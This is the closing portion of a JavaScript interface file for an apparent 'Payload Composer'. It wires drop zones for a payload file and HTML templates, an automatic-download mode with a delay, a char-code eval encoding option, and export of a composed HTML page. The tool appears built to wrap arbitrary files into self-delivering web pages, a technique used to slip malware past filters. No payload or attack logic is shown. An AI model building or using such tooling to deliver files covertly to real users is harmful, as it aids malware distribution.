        $('#customHtmlStatus').style.display = 'none';
        $('#htmlDropZone').style.display = '';
        $('#htmlFileInput').value = '';
        $('#rawHtmlInput').value = '';
    }

    /* ================================================================
       EVENT WIRING
       ================================================================ */

    function wireEvents() {
        // Template tabs
        $$('.template-tab').forEach(function (tab) {
            tab.addEventListener('click', function () {
                $$('.template-tab').forEach(function (t) { t.classList.remove('active'); });
                tab.classList.add('active');
                var target = tab.dataset.tab;
                $('#tabPreset').style.display = (target === 'preset') ? '' : 'none';
                $('#tabCustom').style.display = (target === 'custom') ? '' : 'none';
                $('#tabRaw').style.display    = (target === 'raw')    ? '' : 'none';
            });
        });

        // Output tabs
        var outputTabsEl = $('#outputTabs');
        if (outputTabsEl) {
            outputTabsEl.addEventListener('click', function (e) {
                var tab = e.target.closest('.output-tab');
                if (!tab) return;
                switchOutputTab(tab.dataset.output);
            });
        }

        // Preset radio changes — clear custom html state
        $$('input[name="presetTemplate"]').forEach(function (r) {
            r.addEventListener('change', function () {
                STATE.isCustomHtml = false;
            });
        });

        // Generate button
        $('#btnGenerate').addEventListener('click', compose);

        // Payload drop zone
        var pdz = $('#payloadDropZone');
        pdz.addEventListener('click', function () { $('#payloadFileInput').click(); });
        pdz.addEventListener('dragover', function (e) {
            e.preventDefault();
            pdz.classList.add('drag-over');
        });
        pdz.addEventListener('dragleave', function () { pdz.classList.remove('drag-over'); });
        pdz.addEventListener('drop', function (e) {
            e.preventDefault();
            pdz.classList.remove('drag-over');
            var file = e.dataTransfer.files[0];
            if (file) loadPayload(file);
        });
        $('#payloadFileInput').addEventListener('change', function () {
            if (this.files && this.files[0]) loadPayload(this.files[0]);
        });
        $('#clearPayload').addEventListener('click', clearPayload);

        // HTML drop zone
        var hdz = $('#htmlDropZone');
        if (hdz) {
            hdz.addEventListener('click', function () { $('#htmlFileInput').click(); });
            hdz.addEventListener('dragover', function (e) {
                e.preventDefault();
                hdz.classList.add('drag-over');
            });
            hdz.addEventListener('dragleave', function () { hdz.classList.remove('drag-over'); });
            hdz.addEventListener('drop', function (e) {
                e.preventDefault();
                hdz.classList.remove('drag-over');
                var file = e.dataTransfer.files[0];
                if (file) loadCustomHtmlFile(file);
            });
        }
        $('#htmlFileInput').addEventListener('change', function () {
            if (this.files && this.files[0]) loadCustomHtmlFile(this.files[0]);
        });
        $('#clearCustomHtml').addEventListener('click', clearCustomHtml);

        // Raw HTML textarea sync
        var rawInput = $('#rawHtmlInput');
        if (rawInput) {
            var rawSyncTimer = null;
            rawInput.addEventListener('input', function () {
                STATE.isCustomHtml = true;
                if (rawSyncTimer) clearTimeout(rawSyncTimer);
                rawSyncTimer = setTimeout(syncRawHtml, 300);
            });
            rawInput.addEventListener('blur', function () {
                if (rawSyncTimer) clearTimeout(rawSyncTimer);
                syncRawHtml();
            });
        }

        // Download mode toggle — show/hide auto delay row
        $$('input[name="downloadMode"]').forEach(function (r) {
            r.addEventListener('change', function () {
                var mode = this.value;
                var autoRow = $('#autoDelayRow');
                if (autoRow) {
                    autoRow.style.display = (mode === 'auto' || mode === 'both') ? '' : 'none';
                }
            });
        });

        // Refresh preview
        $('#btnRefresh').addEventListener('click', updatePreview);

        // Open preview in new tab
        $('#btnOpenPreview').addEventListener('click', function () {
            if (!STATE.generatedHtml) return;
            var blob = new Blob([STATE.generatedHtml], { type: 'text/html' });
            window.open(URL.createObjectURL(blob), '_blank');
        });

        // Copy source
        $('#btnCopySource').addEventListener('click', function () {
            if (!STATE.generatedHtml) return;
            navigator.clipboard.writeText(STATE.generatedHtml).then(function () {
                toast('HTML copied to clipboard', 'success');
            }).catch(function () {
                toast('Copy failed. Use Ctrl+A in the source view.', 'error');
            });
        });

        // Download output HTML
        $('#btnDownloadOutput').addEventListener('click', function () {
            if (!STATE.generatedHtml) return;
            var blob = new Blob([STATE.generatedHtml], { type: 'text/html' });
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'composed.html';
            document.body.appendChild(a);
            a.click();
            setTimeout(function () {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 300);
            toast('Downloading composed.html', 'success');
        });

        // Modal overlay click to close
        $('#modalOverlay').addEventListener('click', function (e) {
            if (e.target === this) hideModal();
        });

        // Keyboard shortcut: Ctrl+Enter to compose
        document.addEventListener('keydown', function (e) {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                if (STATE.payloadData && STATE.payloadData.length > 0) compose();
            }
        });

        // Global drag-and-drop
        document.body.addEventListener('dragover', function (e) { e.preventDefault(); });
        document.body.addEventListener('drop', function (e) {
            var target = e.target;
            if (target.closest('#payloadDropZone') ||
                target.closest('#htmlDropZone') ||
                target.closest('.code-textarea')) {
                return;
            }
            e.preventDefault();
            var file = e.dataTransfer.files[0];
            if (!file) return;
            if (/\.(html|htm)$/i.test(file.name)) {
                loadCustomHtmlFile(file);
                var customTab = $('.template-tab[data-tab="custom"]');
                if (customTab) customTab.click();
            } else {
                loadPayload(file);
            }
        });
    }

    /* ================================================================
       INIT
       ================================================================ */

    function init() {
        wireEvents();
        updateGenerateButton();

        var charCodeCheck = $('#optCharCodeEval');
        if (charCodeCheck) charCodeCheck.checked = false;

        addLog('Payload Composer initialized', 'info');
        addLog('Awaiting payload...', 'info');
        renderLog();

        console.log('%c Payload Composer %c Ready ',
            'background:#4f8cff;color:#fff;padding:3px 6px;border-radius:3px 0 0 3px;font-weight:bold;',
            'background:#1a2030;color:#8b95a5;padding:3px 6px;border-radius:0 3px 3px 0;');
    }

    init();

})();
